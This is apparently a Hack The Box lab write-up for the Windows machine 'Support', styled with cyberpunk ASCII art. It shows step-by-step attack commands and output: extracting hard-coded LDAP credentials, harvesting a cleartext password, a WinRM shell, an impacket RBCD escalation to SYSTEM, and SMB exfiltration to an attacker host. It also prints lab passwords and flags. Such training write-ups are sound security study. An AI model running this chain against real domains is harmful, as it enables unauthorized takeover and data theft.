---
cover: https://www.svgrepo.com/show/331423/hack-the-box.svg
aliases:
  - Support
status: PWNED
ip: 10.10.11.174
os: Windows
difficulty: Easy
points: 20
machine_type: HTB
cve_exploited:
  - rbcd
attack_vectors: []
tools_used:
  - impacket
  - bloodhound
  - powerview
  - powermad
  - rubeus
user_flag: 9ff696ada46e1e78d206ffd5d64c80b3
root_flag: 43c3fe8ee2acc70c94348c6ca789ab37
start_date: 2025-11-29
completion_date: 2025-12-02
time_spent: 1h
writeup_author: Netrunner
tags:
  - HTB/Labs
  - HTB/OS/Windows
  - HTB/Difficulty/Easy
  - htb/status/retired
  - activedirectory
  - ldap
  - bloodhound
  - genericall
  - rbcd
  - impacket
banner: 02_Cybersecurity/HackTheBox/HackTheBox_Labs/Tracks/Active_Directory/attachments/2025-11-29 23.21.09.gif
sticker: lucide//box
---

```
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║  ███████╗██╗   ██╗██████╗ ██████╗  ██████╗ ██████╗ ████████╗                  ║
║  ██╔════╝██║   ██║██╔══██╗██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝                  ║
║  ███████╗██║   ██║██████╔╝██████╔╝██║   ██║██████╔╝   ██║                     ║
║  ╚════██║██║   ██║██╔═══╝ ██╔═══╝ ██║   ██║██╔══██╗   ██║                     ║
║  ███████║╚██████╔╝██║     ██║     ╚██████╔╝██║  ██║   ██║                     ║
║  ╚══════╝ ╚═════╝ ╚═╝     ╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝                     ║
║                                                                               ║
║  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ║
║  ░░░ H A C K   T H E   B O X   //   A C T I V E   D I R E C T O R Y ░░░      ║
║  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
```

---

## ░▒▓█ SYSTEM SPECS █▓▒░

> [!info]- `[JACK_IN]` Machine Overview
> ```
> ┌──────────────────────────────────────────────────────────────┐
> │  ████████████████████████████████████████████████████████   │
> │  █  NEURAL INTERFACE ACTIVE  //  TARGET ACQUIRED         █   │
> │  ████████████████████████████████████████████████████████   │
> └──────────────────────────────────────────────────────────────┘
> ```
> | SYSTEM PARAM | DATA_STREAM |
> | --- | --- |
> | **IP_ADDR** | `10.10.11.174` |
> | **OS_KERNEL** | Windows Server 2022 |
> | **THREAT_LEVEL** | Easy |
> | **STATUS** | `[PWNED]` |
> | **BOUNTY** | 20 pts |
> | **SESSION_TIME** | 1h |

---

> [!NOTE]- `[INTEL_DUMP]` [Oxdf Notes](https://0xdf.gitlab.io/2022/12/17/htb-support.html)
> ```
> ████ DECRYPTING TRANSMISSION... ████
> ```
> Support is the 4th box 0xdf had the pleasure of having published on HackTheBox. The inspiration came from [Episode 521](https://7ms.us/7ms-521-tales-of-pentest-pwnage-part-36/) of the Seven Minute Security podcast.
>
> In the real pentest, they found credentials for a shared account in LDAP data, and that shared account had `GenericAll` on the DC. The story: IT support staff have tools in an open share, including `UserInfo.exe`, which has hard-coded credentials the runner can extract.

---

## ░▒▓█ ATTACK_VECTOR.exe █▓▒░

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                                                                             │
│   [RECON] ──▶ [SMB_ENUM] ──▶ [.NET_REVERSE] ──▶ [LDAP_DUMP]                │
│                     │                               │                       │
│                     ▼                               ▼                       │
│              [GET_USERINFO.EXE]              [CREDS_EXTRACTED]              │
│                                                     │                       │
│                                                     ▼                       │
│   [BLOODHOUND] ◀── [SUPPORT_SHELL] ◀── [WINRM_ACCESS]                      │
│        │                                                                    │
│        ▼                                                                    │
│   [GENERICALL_DC] ──▶ [RBCD_ATTACK] ──▶ [ADMIN_SHELL] ──▶ [ROOT]           │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## `[INIT_SCAN]` ░▒▓ RECONNAISSANCE ▓▒░

### `>>> NETWORK_PROBE.sh`

> [!NOTE]+ Neural Interface Scan `[PORT_SWEEP]`
> > [!info]- RUSTSCAN + NMAP PAYLOAD
> > ```bash
> > # ████ EXECUTING PORT SCANNER ████
> > rustscan -a $target --ulimit 5000 -r 1-65535 -- -sCV -oA HTB-Lab-AD-SUPPORT_FULLSCAN
> > ```
> > > Rust scan piped into nmap = high-velocity port enumeration
>
> > [!success]- `[DATA_STREAM]` NMAP Output
> > ```bash
> > ╔══════════════════════════════════════════════════════════════════╗
> > ║                    P O R T   M A T R I X                         ║
> > ╠══════════════════════════════════════════════════════════════════╣
> > PORT      STATE SERVICE       VERSION
> > 53/tcp    open  domain        Simple DNS Plus
> > 88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
> > 135/tcp   open  msrpc         Microsoft Windows RPC
> > 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
> > 389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
> >                               (Domain: support.htb0., Site: Default-First-Site-Name)
> > 445/tcp   open  microsoft-ds?
> > 464/tcp   open  kpasswd5?
> > 593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
> > 636/tcp   open  tcpwrapped
> > 3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
> > 3269/tcp  open  tcpwrapped
> > 5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
> > 9389/tcp  open  mc-nmf        .NET Message Framing
> > 49664/tcp open  msrpc         Microsoft Windows RPC
> > 49667/tcp open  msrpc         Microsoft Windows RPC
> > 49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
> > 49688/tcp open  msrpc         Microsoft Windows RPC
> > 49693/tcp open  msrpc         Microsoft Windows RPC
> > 49715/tcp open  msrpc         Microsoft Windows RPC
> >
> > Host: DC | OS: Windows | CPE: cpe:/o:microsoft:windows
> > SMB signing enabled and required
> > ╚══════════════════════════════════════════════════════════════════╝
> > ```

```
┌────────────────────────────────────────────────────────────────┐
│  ▓▓▓ THREAT ANALYSIS ▓▓▓                                       │
├────────────────────────────────────────────────────────────────┤
│  [!] OPEN VECTORS: 53,88,135,139,389,445,464,593,636,3268...   │
│  [!] HIGH_VALUE: Kerberos (88), DNS (53), LDAP (389/3268)      │
│  [!] ENTRY_POINT: Requires further enumeration                 │
└────────────────────────────────────────────────────────────────┘
```

---

### `>>> SERVICE_ENUM.py`

> [!NOTE]-
> ```
> ████ ATTACK PRIORITY QUEUE ████
> ```
> **TIER_1 :: MANDATORY TARGETS**
> - `SMB` - Hunt for open shares, extract data
> - `LDAP` - Anonymous bind? Data exfil?
>
> **TIER_2 :: SECONDARY VECTORS**
> - `Kerberos` - Username bruteforce? AS-REP-Roast?
> - `DNS` - Zone transfer? Subdomain enum?
> - `RPC` - Anonymous RPC calls?
>
> **TIER_3 :: CREDENTIAL DEPENDENT**
> - `WinRM` - Shell access with valid creds

**`[SYS_CONFIG]` Injecting domain into neural map:**
```bash
sudo nxc smb $target --generate-hosts-file /etc/hosts
# OUTPUT: 10.10.11.174     DC.support.htb support.htb DC
```

---

#### `[LDAP_PROBE]` - Auth Required

> [!failure]+ LDAP - ACCESS_DENIED - Auth Required
>
> > [!important]- ldapsearch payloads
> > ```bash
> > ldapsearch -H ldap://support.htb -x -s base namingcontexts
> > ldapsearch -H ldap://support.htb -x -b "DC=support,DC=htb"
> > ```
>
> > [!important]- `[OUTPUT_STREAM]`
> > ```
> > ╔════════════════════════════════════════════════════════════╗
> > ║  LDAP ANONYMOUS BIND :: PARTIAL SUCCESS                    ║
> > ╠════════════════════════════════════════════════════════════╣
> > namingcontexts: DC=support,DC=htb
> > namingcontexts: CN=Configuration,DC=support,DC=htb
> > namingcontexts: CN=Schema,CN=Configuration,DC=support,DC=htb
> > namingcontexts: DC=DomainDnsZones,DC=support,DC=htb
> > namingcontexts: DC=ForestDnsZones,DC=support,DC=htb
> > ╠════════════════════════════════════════════════════════════╣
> > ║  [X] FULL DUMP BLOCKED                                     ║
> > ║  ERROR: 000004DC: LdapErr: DSID-0C090A5A                    ║
> > ║  "successful bind must be completed on the connection"     ║
> > ╚════════════════════════════════════════════════════════════╝
> > ```

---

#### `[SMB_INFILTRATION]` - TCP 445

> [!tip]+ SMB Enumeration `[SHARE_HUNT]`
>
> > [!failure]- netexec - BLOCKED
> > ```bash
> > nxc smb support.htb --shares
> > # ████ ACCESS DENIED ████
> > ```
>
> > [!success]- smbclient - `[SHARE_DETECTED]`
> > ```bash
> > smbclient -N -L //support.htb
> > ```
> > ```
> > ┌──────────────────────────────────────────────────┐
> > │  ████ SHARE MATRIX ████                          │
> > ├──────────────────────────────────────────────────┤
> > │  ADMIN$         - [LOCKED]                       │
> > │  C$             - [LOCKED]                       │
> > │  IPC$           - [PARTIAL]                      │
> > │  NETLOGON       - [LOCKED]                       │
> > │  support-tools  - [OPEN] <<< TARGET ACQUIRED     │
> > │  SYSVOL         - [LOCKED]                       │
> > └──────────────────────────────────────────────────┘
> > ```
> >
> > ```bash
> > smbclient -N //support.htb/support-tools
> > smb: \> ls
> > smb: \> get UserInfo.exe.zip
> > ```
> > ```
> > ╔═══════════════════════════════════════════════════════════════╗
> > ║  [!] PAYLOAD EXTRACTED: UserInfo.exe.zip                      ║
> > ║  [!] TRANSPORT: Moving to Windows VM for .NET analysis        ║
> > ╚═══════════════════════════════════════════════════════════════╝
> > ```

---

## `[CRED_HARVEST]` ░▒▓ LDAP AUTHENTICATION ▓▒░

### `>>> UserInfo.exe` Reverse Engineering

> **`[RUNTIME: WINDOWS_VM]`**

```powershell
# ████ BINARY ANALYSIS ████
.\UserInfo.exe
# [-] At least one of -first or -last is required.

.\UserInfo.exe user -username john
# [-] Exception: The server is not operational.
```

> After adding `support.htb` to Windows hosts file and connecting to HTB VPN:

```powershell
# ████ LDAP INJECTION ████
.\UserInfo.exe find -first '*'
```
```
┌─────────────────────────────────────┐
│  ████ USER DUMP ████                │
├─────────────────────────────────────┤
│  raven.clifton                      │
│  anderson.damian                    │
│  monroe.david                       │
│  cromwell.gerard                    │
│  west.laura                         │
│  levine.leopoldo                    │
│  langley.lucy                       │
│  daughtler.mabel                    │
│  bardot.mary                        │
│  stoll.rachelle                     │
│  thomas.raphael                     │
│  smith.rosario                      │
│  wilson.shelby                      │
│  hernandez.stanley                  │
│  ford.victoria                      │
└─────────────────────────────────────┘
```

### `>>> CREDENTIAL_EXTRACTION.sh`

> **`[RUNTIME: KALI_LINUX]`** - Using `mono` to execute .NET binaries with packet capture

```bash
# ████ PACKET SNIFF ATTACK ████
mono ./UserInfo.exe find -first "*"
# Running with Wireshark capture...
```

```
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║  ██████╗██████╗ ███████╗██████╗ ███████╗    ███████╗██╗  ██╗████████╗██████╗  ║
║ ██╔════╝██╔══██╗██╔════╝██╔══██╗██╔════╝    ██╔════╝╚██╗██╔╝╚══██╔══╝██╔══██╗ ║
║ ██║     ██████╔╝█████╗  ██║  ██║███████╗    █████╗   ╚███╔╝    ██║   ██████╔╝ ║
║ ██║     ██╔══██╗██╔══╝  ██║  ██║╚════██║    ██╔══╝   ██╔██╗    ██║   ██╔══██╗ ║
║ ╚██████╗██║  ██║███████╗██████╔╝███████║    ███████╗██╔╝ ██╗   ██║   ██║  ██║ ║
║  ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ ╚══════╝    ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝ ║
║                                                                               ║
║  [USER] ldap                                                                  ║
║  [PASS] nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz                                  ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
```

### `>>> CRED_VALIDATION.sh`

```bash
nxc smb support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```
```
╔════════════════════════════════════════════════════════════════╗
║  SMB  10.10.11.174  445  DC  [+] support.htb\ldap  [VALID]     ║
╚════════════════════════════════════════════════════════════════╝
```

---

## `[SHELL_ACCESS]` ░▒▓ NEURAL JACK: SUPPORT ▓▒░

### `>>> bloodhound_harvest.sh`

```bash
# ████ AD RECONNAISSANCE ████
# bloodhound-ce-python - Remote AD enumeration without shell access
bloodhound-ce-python -c all \
    -u ldap \
    -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
    -d support.htb \
    -ns $target \
    --zip
```

| Flag | Function |
|------|----------|
| `-c all` | Collect all data (users, groups, sessions, ACLs, trusts) |
| `-u` | Username for LDAP bind |
| `-p` | Password for authentication |
| `-d` | Target domain |
| `-ns` | Nameserver IP |
| `--zip` | Compress output for BloodHound import |

---

### `>>> ldap_deepdive.sh`

> [!bug] LDAP Data Exfiltration
>
> > [!info]- `ldapsearch` - Full Dump
> > ```bash
> > ldapsearch -x -H ldap://support.htb \
> >     -D 'ldap@support.htb' \
> >     -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
> >     -b "DC=support,DC=htb" | less
> > ```
> >
> > ```
> > ╔═══════════════════════════════════════════════════════════════════════════╗
> > ║  ████ ANOMALY DETECTED: USER 'support' ████                               ║
> > ╠═══════════════════════════════════════════════════════════════════════════╣
> > ║  dn: CN=support,CN=Users,DC=support,DC=htb                                ║
> > ║  cn: support                                                              ║
> > ║  memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb          ║
> > ║  memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb        ║
> > ║                                                                           ║
> > ║  ███████████████████████████████████████████████████████████████████████  ║
> > ║  █  info: Ironside47pleasure40Watchful  <<< PASSWORD IN CLEARTEXT!    █  ║
> > ║  ███████████████████████████████████████████████████████████████████████  ║
> > ╚═══════════════════════════════════════════════════════════════════════════╝
> > ```
>
> > [!info]- `ldapdomaindump` - Confirmation
> > ```bash
> > ldapdomaindump -u support.htb\\ldap \
> >     -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
> >     support.htb -o ldap
> >
> > grep Ironside *
> > # domain_users.json: "Ironside47pleasure40Watchful"
> > ```

---

### `>>> support_pwned.sh`

```bash
# ████ VALIDATING SUPPORT CREDENTIALS ████
nxc winrm support.htb -u support -p 'Ironside47pleasure40Watchful'
```
```
╔═════════════════════════════════════════════════════════════════════════════╗
║  WINRM  10.10.11.174  5985  DC  [+] support.htb\support  (Pwn3d!)           ║
╚═════════════════════════════════════════════════════════════════════════════╝
```

### `>>> bloodhound_analysis.exe`

> BloodHound CE analysis reveals critical attack path:

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                                                                             │
│   SUPPORT@SUPPORT.HTB                                                       │
│          │                                                                  │
│          ▼                                                                  │
│   [SHARED SUPPORT ACCOUNTS]                                                 │
│          │                                                                  │
│          │  GenericAll                                                      │
│          ▼                                                                  │
│   DC.SUPPORT.HTB  ◀◀◀  CRITICAL VULNERABILITY                              │
│                                                                             │
│   ████████████████████████████████████████████████████████████████████████ │
│   █  GenericAll = FULL CONTROL OVER DOMAIN CONTROLLER                    █ │
│   ████████████████████████████████████████████████████████████████████████ │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### `>>> neural_link.sh`

```bash
# ████ ESTABLISHING REMOTE SHELL ████
evil-winrm -i support.htb -u support -p Ironside47pleasure40Watchful
```

```powershell
*Evil-WinRM* PS C:\Users\support\Desktop> cat user.txt
```
```
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║  ██╗   ██╗███████╗███████╗██████╗     ███████╗██╗      █████╗  ██████╗        ║
║  ██║   ██║██╔════╝██╔════╝██╔══██╗    ██╔════╝██║     ██╔══██╗██╔════╝        ║
║  ██║   ██║███████╗█████╗  ██████╔╝    █████╗  ██║     ███████║██║  ███╗       ║
║  ██║   ██║╚════██║██╔══╝  ██╔══██╗    ██╔══╝  ██║     ██╔══██║██║   ██║       ║
║  ╚██████╔╝███████║███████╗██║  ██║    ██║     ███████╗██║  ██║╚██████╔╝       ║
║   ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝    ╚═╝     ╚══════╝╚═╝  ╚═╝ ╚═════╝        ║
║                                                                               ║
║  >>> 9ff696ada46e1e78d206ffd5d64c80b3                                        ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
```

---

## `[LEGACY_SYS]` ░▒▓ BLOODHOUND LEGACY SETUP ▓▒░

> BloodHound Legacy provides additional visualization capabilities

```bash
# ████ NEO4J DATABASE INIT ████
sudo apt install -y neo4j
sudo neo4j start
# Access: http://localhost:7474/ | Default: neo4j:neo4j
```

```bash
# ████ BLOODHOUND CLIENT ████
unzip BloodHound-linux-x64.zip
./BloodHound-linux-x64/BloodHound
```

```
┌────────────────────────────────────────────────────────────────────────────┐
│  ████ ATTACK PATH VISUALIZATION ████                                       │
│                                                                            │
│  Right-click GenericAll edge → "Help"                                      │
│                                                                            │
│  ATTACK_OPTIONS:                                                           │
│  ├── Shadow Credentials                                                    │
│  ├── Resource-Based Constrained Delegation (RBCD)  ◀◀◀ SELECTED           │
│  ├── DCSync                                                                │
│  └── Add to Group                                                          │
└────────────────────────────────────────────────────────────────────────────┘
```

---

## `[ROOT_ACCESS]` ░▒▓ ADMINISTRATOR SHELL ▓▒░

> [!NOTE] RBCD Privilege Escalation
>
> ### `[ABORT]` Windows Abuse Path
>
> > [!failure]- Windows Attack - FAILED
> > ```
> > ████████████████████████████████████████████████████████████████████████
> > █  [X] RUBEUS S4U ATTACK FAILED                                        █
> > █  [X] KRB-ERROR (6) : KDC_ERR_C_PRINCIPAL_UNKNOWN                     █
> > █                                                                      █
> > █  Most writeups use this method - IT DOES NOT WORK                    █
> > ████████████████████████████████████████████████████████████████████████
> > ```
> >
> > Attempted commands:
> > ```powershell
> > # Create fake computer
> > New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
> >
> > # Configure RBCD
> > Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
> >
> > # S4U Attack - FAILED
> > ./rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
> > ```
>
> ### `[EXECUTE]` Linux Abuse Path
>
> > [!success]- Linux Attack - `[ROOT_ACHIEVED]`
> >
> > ```bash
> > # ████ STEP 1: CREATE ROGUE COMPUTER ████
> > impacket-addcomputer \
> >     -computer-name 'ATTACKER$' \
> >     -computer-pass 'P@ssw0rd123' \
> >     -dc-ip 10.10.11.174 \
> >     'support.htb/support:Ironside47pleasure40Watchful'
> > ```
> >
> > ```bash
> > # ████ STEP 2: CONFIGURE RBCD ████
> > impacket-rbcd \
> >     -delegate-to 'DC$' \
> >     -delegate-from 'ATTACKER$' \
> >     -dc-ip 10.10.11.174 \
> >     -action write \
> >     'support.htb/support:Ironside47pleasure40Watchful'
> > ```
> >
> > ```bash
> > # ████ STEP 3: REQUEST SERVICE TICKET ████
> > impacket-getST \
> >     -spn 'cifs/dc.support.htb' \
> >     -impersonate Administrator \
> >     -dc-ip 10.10.11.174 \
> >     'support.htb/ATTACKER$:P@ssw0rd123'
> > ```
> >
> > ```bash
> > # ████ STEP 4: LOAD KERBEROS TICKET ████
> > export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
> > ```
> >
> > ```bash
> > # ████ STEP 5: SYSTEM SHELL ████
> > impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass
> > ```
> >
> > ```
> > ╔═══════════════════════════════════════════════════════════════════════════╗
> > ║                                                                           ║
> > ║  ███╗   ██╗████████╗     █████╗ ██╗   ██╗████████╗██╗  ██╗ ██████╗ ██████╗ ║
> > ║  ████╗  ██║╚══██╔══╝    ██╔══██╗██║   ██║╚══██╔══╝██║  ██║██╔═══██╗██╔══██╗║
> > ║  ██╔██╗ ██║   ██║       ███████║██║   ██║   ██║   ███████║██║   ██║██████╔╝║
> > ║  ██║╚██╗██║   ██║       ██╔══██║██║   ██║   ██║   ██╔══██║██║   ██║██╔══██╗║
> > ║  ██║ ╚████║   ██║       ██║  ██║╚██████╔╝   ██║   ██║  ██║╚██████╔╝██║  ██║║
> > ║  ╚═╝  ╚═══╝   ╚═╝       ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝║
> > ║                                                                           ║
> > ║  C:\Windows\system32>whoami                                               ║
> > ║  nt authority\system                                                      ║
> > ║                                                                           ║
> > ╚═══════════════════════════════════════════════════════════════════════════╝
> > ```

---

### `>>> data_exfil.sh`

> Windows `type` command corrupts flag output - using SMB exfiltration:

```bash
# ████ KALI: START SMB SERVER ████
sudo impacket-smbserver share . -smb2support -username pentest -password password
```

```powershell
# ████ TARGET: EXFILTRATE FLAG ████
net use \\10.10.14.7\share /user:pentest password
copy root.txt \\10.10.14.7\share\
```

```
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║  ██████╗  ██████╗  ██████╗ ████████╗    ███████╗██╗      █████╗  ██████╗      ║
║  ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝    ██╔════╝██║     ██╔══██╗██╔════╝      ║
║  ██████╔╝██║   ██║██║   ██║   ██║       █████╗  ██║     ███████║██║  ███╗     ║
║  ██╔══██╗██║   ██║██║   ██║   ██║       ██╔══╝  ██║     ██╔══██║██║   ██║     ║
║  ██║  ██║╚██████╔╝╚██████╔╝   ██║       ██║     ███████╗██║  ██║╚██████╔╝     ║
║  ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝       ╚═╝     ╚══════╝╚═╝  ╚═╝ ╚═════╝      ║
║                                                                               ║
║  >>> 43c3fe8ee2acc70c94348c6ca789ab37                                        ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
```

---

## `[DATA_VAULT]` ░▒▓ CREDENTIALS DATABASE ▓▒░

```
╔═════════════════════════════════════════════════════════════════════════════════════════════╗
║                           C R E D E N T I A L   M A T R I X                                 ║
╠═══════════╦══════════╦══════════════════════════════════════════╦══════════════════════════╣
║   TYPE    ║   USER   ║              PASSWORD/HASH               ║         SOURCE           ║
╠═══════════╬══════════╬══════════════════════════════════════════╬══════════════════════════╣
║   LDAP    ║   ldap   ║ nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz    ║   UserInfo.exe           ║
╠═══════════╬══════════╬══════════════════════════════════════════╬══════════════════════════╣
║  MACHINE  ║ support  ║ Ironside47pleasure40Watchful             ║   ldapdomaindump         ║
╚═══════════╩══════════╩══════════════════════════════════════════╩══════════════════════════╝
```

---

## `[LOOT]` ░▒▓ FLAGS & PROOF ▓▒░

> [!success]+ `>>> user.flag`
> ```
> ┌─────────────────────────────────────────────────────────────┐
> │  LOCATION: C:\Users\support\Desktop\user.txt               │
> │  ───────────────────────────────────────────────────────── │
> │  9ff696ada46e1e78d206ffd5d64c80b3                          │
> └─────────────────────────────────────────────────────────────┘
> ```

> [!success]+ `>>> root.flag`
> ```
> ┌─────────────────────────────────────────────────────────────┐
> │  LOCATION: C:\Users\Administrator\Desktop\root.txt         │
> │  ───────────────────────────────────────────────────────── │
> │  43c3fe8ee2acc70c94348c6ca789ab37                          │
> └─────────────────────────────────────────────────────────────┘
> ```

---

## `[THREAT_MAP]` ░▒▓ MITRE ATT&CK MATRIX ▓▒░

```
╔═══════════════════════════════════════════════════════════════════════════════════════════════╗
║                              A T T & C K   M A P P I N G                                      ║
╠═════════════════════╦═══════════════╦════════════════════════════════╦════════════════════════╣
║       TACTIC        ║  TECHNIQUE ID ║        TECHNIQUE NAME          ║       EXECUTION        ║
╠═════════════════════╬═══════════════╬════════════════════════════════╬════════════════════════╣
║   Reconnaissance    ║   T1595.002   ║ Vulnerability Scanning         ║ Nmap/Rustscan          ║
╠═════════════════════╬═══════════════╬════════════════════════════════╬════════════════════════╣
║   Initial Access    ║   T1078       ║ Valid Accounts                 ║ LDAP creds from .NET   ║
╠═════════════════════╬═══════════════╬════════════════════════════════╬════════════════════════╣
║   Execution         ║   T1059       ║ Command/Scripting Interpreter  ║ Evil-WinRM shell       ║
╠═════════════════════╬═══════════════╬════════════════════════════════╬════════════════════════╣
║   Priv Escalation   ║   T1134       ║ Access Token Manipulation      ║ RBCD + S4U2Self        ║
╚═════════════════════╩═══════════════╩════════════════════════════════╩════════════════════════╝
```

---

## `[REFS]` ░▒▓ INTEL SOURCES ▓▒░

- [0xdf Writeup](https://0xdf.gitlab.io/2022/12/17/htb-support.html)
- [BloodHound CE Python](https://github.com/dirkjanm/BloodHound.py)
- [Impacket Suite](https://github.com/fortra/impacket)

---

## `[QUERY]` ░▒▓ RELATED TARGETS ▓▒░

> [!note]- Other Windows Targets
> ```dataview
> TABLE difficulty, ip, status
> FROM #HTB/OS/Windows AND !"00_Meta"
> WHERE file.name != this.file.name
> SORT difficulty ASC
> ```

---

```
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║   ██████╗ ██╗    ██╗███╗   ██╗███████╗██████╗                                 ║
║   ██╔══██╗██║    ██║████╗  ██║██╔════╝██╔══██╗                                ║
║   ██████╔╝██║ █╗ ██║██╔██╗ ██║█████╗  ██║  ██║                                ║
║   ██╔═══╝ ██║███╗██║██║╚██╗██║██╔══╝  ██║  ██║                                ║
║   ██║     ╚███╔███╔╝██║ ╚████║███████╗██████╔╝                                ║
║   ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═════╝                                 ║
║                                                                               ║
║   ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ║
║                                                                               ║
║   Last Updated: 2025-12-02                                                    ║
║   Writeup Author: Netrunner                                                   ║
║   Session Status: [TERMINATED]                                                ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
```
